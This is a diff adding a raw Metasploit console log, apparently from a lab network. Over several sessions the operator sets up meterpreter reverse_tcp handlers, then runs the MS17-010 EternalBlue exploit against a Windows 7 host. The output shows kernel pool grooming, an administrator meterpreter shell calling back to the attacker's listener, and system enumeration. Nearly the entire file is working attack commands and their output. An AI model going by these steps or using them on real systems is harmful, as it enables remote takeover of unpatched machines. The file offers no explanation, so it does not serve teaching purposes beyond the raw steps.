@@ -1,0 +1,2061 @@
+[1m[34m[*][0m Spooling to file msf-output...
+[?1034h[4mmsf[0m [0m> exit
+[0m[1m[34m[*][0m Spooling to file msf-output...
+[?1034h[4mmsf[0m [0m> use exploit/mut[Klti/handler 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set payload linux/x86/meterpreter/reverse_tcp
+[0mpayload => linux/x86/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST=10.10.20.151
+[0m[1m[31m[-][0m Unknown variable
+Usage: set [option] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lhost 10.10.20.151
+[0mlhost => 10.10.20.151
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lport 443
+[0mlport => 443
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> show options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.20.151     yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[34m[*][0m Sending stage (861480 bytes) to 10.10.100.91
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.20.151:443 -> 10.10.100.91:33944) at 2019-01-27 17:17:19 -0500
+[0m
+[0m[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.100.91 - Meterpreter session 1 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exit
+[0m[1m[34m[*][0m Spooling to file msf-output...
+[?1034h[4mmsf[0m [0m> use exploit/multi/handler 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set payload linux/x86/meterpreter/reverse_tcp
+[0mpayload => linux/x86/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lhost 10.10.20.151
+[0mlhost => 10.10.20.151
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lport 443
+[0mlport => 443
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lport 443[Kshow options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.20.151     yes       The listen address (an interface may be specified)
+   LPORT  443              yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[34m[*][0m Sending stage (861480 bytes) to 10.10.100.91
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.20.151:443 -> 10.10.100.91:33952) at 2019-01-27 17:20:29 -0500
+[0m
+[0m[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.100.91 - Meterpreter session 1 closed.  Reason: Died
+
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> man prc[K[K[Krpcbind
+[0m[1m[34m[*][0m exec: man rpcbind
+
+
+RPCBIND(8)                               BSD System Manager's Manual                               RPCBIND(8)
+
+NAME
+     rpcbind — universal addresses to RPC program number mapper
+
+SYNOPSIS
+     rpcbind [-adhiLls]
+
+DESCRIPTION
+     The rpcbind utility is a server that converts RPC program numbers into universal addresses.  It must be
+     running on the host to be able to make RPC calls on a server on that machine.
+
+     When an RPC service is started, it tells rpcbind the address at which it is listening, and the RPC pro‐
+     gram numbers it is prepared to serve.  When a client wishes to make an RPC call to a given program num‐
+     ber, it first contacts rpcbind on the server machine to determine the address where RPC requests should
+     be sent.
+
+     The rpcbind utility should be started before any other RPC service.  Normally, standard RPC servers are
+     started by port monitors, so rpcbind must be started before port monitors are invoked.
+
+     When rpcbind is started, it checks that certain name-to-address translation-calls function correctly.
+     If they fail, the network configuration databases may be corrupt.  Since RPC services cannot function
+     correctly in this situation, rpcbind reports the condition and terminates.
+
+     The rpcbind utility can only be started by the super-user.
+
+OPTIONS
+     -a      When debugging (-d), do an abort on errors.
+
+     -d      Run in debug mode.  In this mode, rpcbind will log additional information during operation, and
+             will abort on certain errors if -a is also specified.  With this option, the name-to-address
+             translation consistency checks are shown in detail.
+
+     -f      Do not fork and become a background process.
+
+     -h      Specify specific IP addresses to bind to for UDP requests.  This option may be specified multi‐
+             ple times and is typically necessary when running on a multi-homed host.  If no -h option is
+             specified, rpcbind will bind to INADDR_ANY, which could lead to problems on a multi-homed host
+             due to rpcbind returning a UDP packet from a different IP address than it was sent to.  Note
+             that when specifying IP addresses with -h, rpcbind will automatically add 127.0.0.1 and if IPv6
+             is enabled, ::1 to the list.
+
+     -i      “Insecure” mode.  Allow calls to SET and UNSET from any host.  Normally rpcbind accepts these
+             requests only from the loopback interface for security reasons.  This change is necessary for
+             programs that were compiled with earlier versions of the rpc library and do not make those
+             requests using the loopback interface.
+
+     -l      Turn on libwrap connection logging.
+
+     -s      Cause rpcbind to change to the user daemon as soon as possible.  This causes rpcbind to use non-
+             privileged ports for outgoing connections, preventing non-privileged clients from using rpcbind
+             to connect to services from a privileged port.
+
+     -w      Cause rpcbind to do a "warm start" by read a state file when rpcbind starts up. The state file
+             is created when rpcbind terminates.
+
+NOTES
+     All RPC servers must be restarted if rpcbind is restarted.
+
+SEE ALSO
+     rpcinfo(8)
+
+LINUX PORT
+     Aurelien Charbon <aurelien.charbon@bull.net>
+
+BSD                                           September 14, 1992                                          BSD
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> man flush
+[0m[1m[34m[*][0m exec: man flush
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> ,[Kman dbl[Kflush
+[0m[1m[34m[*][0m exec: man dbflush
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> man dbflush[P[Pflushrpcbindrun[Kshow options et lport 443host 10.10.20.151[P[P[P[P[P[P[P[P[Pport 443how options run[K
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[34m[*][0m Sending stage (861480 bytes) to 10.10.100.91
+[1m[34m[*][0m Meterpreter session 2 opened (10.10.20.151:443 -> 10.10.100.91:34094) at 2019-01-27 18:29:53 -0500
+[0m
+[0m[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.100.91 - Meterpreter session 2 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exit[Prun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[34m[*][0m Sending stage (861480 bytes) to 10.10.100.91
+[1m[34m[*][0m Meterpreter session 3 opened (10.10.20.151:443 -> 10.10.100.91:34316) at 2019-01-27 20:25:18 -0500
+[0m
+[0m[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.100.91 - Meterpreter session 3 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [K[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exit
+[0m[1m[34m[*][0m Spooling to file msf-output...
+[?1034h[4mmsf[0m [0m> use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 10.10.20.151set lp ort 443run
+[0m[1m[31m[-][0m Failed to load module: exploit/multi/handlerset
+[4mmsf[0m [0m> use exploit/multi/handler
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set payload linux/x86/meterpreter/reverse_tcp
+[0mpayload => linux/x86/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lhost 10.10.20.151
+[0mlhost => 10.10.20.151
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lport 443
+[0mlport => 443
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[34m[*][0m Sending stage (861480 bytes) to 10.10.100.91
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.20.151:443 -> 10.10.100.91:35390) at 2019-01-28 05:47:38 -0500
+[0m
+[0m[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.100.91 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exit[Prun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[34m[*][0m Sending stage (861480 bytes) to 10.10.100.91
+[1m[34m[*][0m Meterpreter session 2 opened (10.10.20.151:443 -> 10.10.100.91:35512) at 2019-01-28 06:50:54 -0500
+[0m
+[0m[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.100.91 - Meterpreter session 2 closed.  Reason: Died
+
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[34m[*][0m Sending stage (861480 bytes) to 10.10.100.91
+[1m[34m[*][0m Meterpreter session 3 opened (10.10.20.151:443 -> 10.10.100.91:35530) at 2019-01-28 06:59:00 -0500
+[0m
+[0m[4mmeterpreter[0m > 
+[1m[34m[*][0m 10.10.100.91 - Meterpreter session 3 closed.  Reason: Died
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exit[Prunexit[Kexit[Prun
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:443 
+[1m[31m[-][0m Exploit failed: Interrupt 
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exit
+[0m[1m[34m[*][0m Spooling to file msf-output...
+[?1034h[4mmsf[0m [0m> use e[K[K[K[K[Kseach eternal
+[0m[1m[31m[-][0m Unknown command: seach.
+[4mmsf[0m [0m> find [K[K[K[K[Ksearch eternal
+[0m
+Matching Modules
+================
+
+   Name                                           Disclosure Date  Rank     Check  Description
+   ----                                           ---------------  ----     -----  -----------
+   auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
+   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+
+[4mmsf[0m [0m> use  exploit/windows/smb/ms17_010_eternalblue
+[0m[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show payload
+[0m[1m[31m[-][0m Invalid parameter "payload", use "show -h" for more information
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show payload
+[0m[1m[31m[-][0m Invalid parameter "payload", use "show -h" for more information
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show 
+[0m
+Compatible Encoders
+===================
+
+   Name              Disclosure Date  Rank    Check  Description
+   ----              ---------------  ----    -----  -----------
+   generic/eicar                      manual  No     The EICAR Encoder
+   generic/none                       normal  No     The "none" Encoder
+   x64/xor                            normal  No     XOR Encoder
+   x64/xor_dynamic                    normal  No     Dynamic key XOR Encoder
+   x64/zutto_dekiru                   manual  No     Zutto Dekiru
+
+
+NOP Generators
+==============
+
+   Name             Disclosure Date  Rank    Check  Description
+   ----             ---------------  ----    -----  -----------
+   aarch64/simple                    normal  No     Simple
+   armle/simple                      normal  No     Simple
+   mipsbe/better                     normal  No     Better
+   php/generic                       normal  No     PHP Nop Generator
+   ppc/simple                        normal  No     Simple
+   sparc/random                      normal  No     SPARC NOP Generator
+   tty/generic                       normal  No     TTY Nop Generator
+   x64/simple                        normal  No     Simple
+   x86/opty2                         normal  No     Opty2
+   x86/single_byte                   normal  No     Single Byte
+
+[1m[31m[-][0m show: Interrupted
+Interrupt: use the 'exit' command to quit
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show payloads
+[0m
+Compatible Payloads
+===================
+
+   Name                                        Disclosure Date  Rank    Check  Description
+   ----                                        ---------------  ----    -----  -----------
+   generic/custom                                               normal  No     Custom Payload
+   generic/shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline
+   windows/x64/exec                                             normal  No     Windows x64 Execute Command
+   windows/x64/loadlibrary                                      normal  No     Windows x64 LoadLibrary Path
+   windows/x64/messagebox                                       normal  No     Windows MessageBox x64
+   windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
+   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
+   windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
+   windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
+   windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
+   windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+   windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+   windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+   windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
+   windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
+   windows/x64/powershell_bind_tcp                              normal  No     Windows Interactive Powershell Session, Bind TCP
+   windows/x64/powershell_reverse_tcp                           normal  No     Windows Interactive Powershell Session, Reverse TCP
+   windows/x64/shell/bind_ipv6_tcp                              normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager
+   windows/x64/shell/bind_ipv6_tcp_uuid                         normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support
+   windows/x64/shell/bind_named_pipe                            normal  No     Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager
+   windows/x64/shell/bind_tcp                                   normal  No     Windows x64 Command Shell, Windows x64 Bind TCP Stager
+   windows/x64/shell/bind_tcp_uuid                              normal  No     Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)
+   windows/x64/shell/reverse_tcp                                normal  No     Windows x64 Command Shell, Windows x64 Reverse TCP Stager
+   windows/x64/shell/reverse_tcp_rc4                            normal  No     Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/x64/shell/reverse_tcp_uuid                           normal  No     Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
+   windows/x64/shell_bind_tcp                                   normal  No     Windows x64 Command Shell, Bind TCP Inline
+   windows/x64/shell_reverse_tcp                                normal  No     Windows x64 Command Shell, Reverse TCP Inline
+   windows/x64/vncinject/bind_ipv6_tcp                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager
+   windows/x64/vncinject/bind_ipv6_tcp_uuid                     normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 IPv6 Bind TCP Stager with UUID Support
+   windows/x64/vncinject/bind_named_pipe                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind Named Pipe Stager
+   windows/x64/vncinject/bind_tcp                               normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Bind TCP Stager
+   windows/x64/vncinject/bind_tcp_uuid                          normal  No     Windows x64 VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x64)
+   windows/x64/vncinject/reverse_http                           normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/vncinject/reverse_https                          normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (wininet)
+   windows/x64/vncinject/reverse_tcp                            normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
+   windows/x64/vncinject/reverse_tcp_rc4                        normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   windows/x64/vncinject/reverse_tcp_uuid                       normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
+   windows/x64/vncinject/reverse_winhttp                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
+   windows/x64/vncinject/reverse_winhttps                       normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set payload windows/x64/meterpreter/reverse_tcp
+[0mpayload => windows/x64/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options 
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOST                           yes       The target address
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set rhost 192.168.1.77
+[0mrhost => 192.168.1.77
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set lhost 10.10.1[K20.151
+[0mlhost => 10.10.20.151
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> set [K[K[K[Kshow options 
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOST          192.168.1.77     yes       The target address
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.20.151     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:4444 
+[1m[34m[*][0m 192.168.1.77:445 - Connecting to target for exploitation.
+[1m[31m[-][0m 192.168.1.77:445 - Rex::ConnectionTimeout: The connection timed out (192.168.1.77:445).
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> runshow options et lhost 10.10.20.151rhost 192.168.1.77[P.168.1.77[P.168.1.77[P.168.1.771.168.1.770.168.1.77[C[C[P8.1.77[P.1.770.1.77[C[C0.770.77
+[0mrhost => 10.10.100.77
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> show options 
+[0m
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOST          10.10.100.77     yes       The target address
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.20.151     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.20.151:4444 
+[1m[34m[*][0m 10.10.100.77:445 - Connecting to target for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Connection established for exploitation.
+[1m[32m[+][0m 10.10.100.77:445 - Target OS selected valid for OS indicated by SMB reply
+[1m[34m[*][0m 10.10.100.77:445 - CORE raw buffer dump (23 bytes)
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[1m[34m[*][0m 10.10.100.77:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         
+[1m[32m[+][0m 10.10.100.77:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[1m[34m[*][0m 10.10.100.77:445 - Trying exploit with 12 Groom Allocations.
+[1m[34m[*][0m 10.10.100.77:445 - Sending all but last fragment of exploit packet
+[1m[34m[*][0m 10.10.100.77:445 - Starting non-paged pool grooming
+[1m[32m[+][0m 10.10.100.77:445 - Sending SMBv2 buffers
+[1m[32m[+][0m 10.10.100.77:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[1m[34m[*][0m 10.10.100.77:445 - Sending final SMBv2 buffers.
+[1m[34m[*][0m 10.10.100.77:445 - Sending last fragment of exploit packet!
+[1m[34m[*][0m 10.10.100.77:445 - Receiving response from exploit packet
+[1m[32m[+][0m 10.10.100.77:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[1m[34m[*][0m 10.10.100.77:445 - Sending egg to corrupted connection.
+[1m[34m[*][0m 10.10.100.77:445 - Triggering free of corrupted buffer.
+[1m[34m[*][0m Sending stage (206403 bytes) to 10.10.100.77
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.20.151:4444 -> 10.10.100.77:49216) at 2019-03-15 11:51:48 -0400
+[0m[0m[1m[32m[+][0m 10.10.100.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.10.100.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[1m[32m[+][0m 10.10.100.77:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[0m[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.100.77 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> exit
+[0m[1m[34m[*][0m Spooling to file msf-output...
+[?1034h[4mmsf[0m [0m> use exploit/multi/handler 
+[0m[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set payload windw[Kows/me[K[Kx64/meterpreter/reverse_tcp
+[0mpayload => windows/x64/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> show options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lhost 1127.0[K[K[K[K[K[K0.0.0.0
+[0mlhost => 0.0.0.0
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set lport 15091
+[0mlport => 15091
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> run
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 0.0.0.0:15091 
+[1m[34m[*][0m Sending stage (206403 bytes) to 10.10.100.77
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.20.151:15091 -> 10.10.100.77:57781) at 2019-04-05 17:19:19 -0400
+[0m[0m
+[0m[4mmeterpreter[0m > localtime
+[0mLocal Date/Time: 2019-04-05 21:23:38.73 Pacific Daylight Time (UTC-800)
+[4mmeterpreter[0m > getpid
+[0mCurrent pid: 4812
+[4mmeterpreter[0m > getuid
+[0mServer username: STARWARS\administrator
+[4mmeterpreter[0m > sysinfo
+[0mComputer        : SBWIN7
+OS              : Windows 7 (Build 7600).
+Architecture    : x64
+System Language : en_US
+Domain          : STARWARS
+Logged On Users : 2
+Meterpreter     : x64/windows
+[4mmeterpreter[0m > run multicommand -cl "systeminfo"
+[0m[1m[34m[*][0m Running Command List ...
+[1m[34m[*][0m 	running command systeminfo
+[1m[34m[*][0m 
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m       Output of systeminfo
+[1m[34m[*][0m *****************************************
+[1m[34m[*][0m 
+[1m[34m[*][0m Host Name:                 SBWIN7
+[1m[34m[*][0m OS Name:                   Microsoft Windows 7 Ultimate 
+[1m[34m[*][0m OS Version:                6.1.7600 N/A Build 7600
+[1m[34m[*][0m OS Manufacturer:           Microsoft Corporation
+[1m[34m[*][0m OS Configuration:          Member Workstation
+[1m[34m[*][0m OS Build Type:             Multiprocessor Free
+[1m[34m[*][0m Registered Owner:          root
+[1m[34m[*][0m Registered Organization:   
+[1m[34m[*][0m Product ID:                00426-OEM-8992662-00400
+[1m[34m[*][0m Original Install Date:     4/4/2014, 12:54:19 PM
+[1m[34m[*][0m System Boot Time:          3/26/2019, 8:44:58 PM
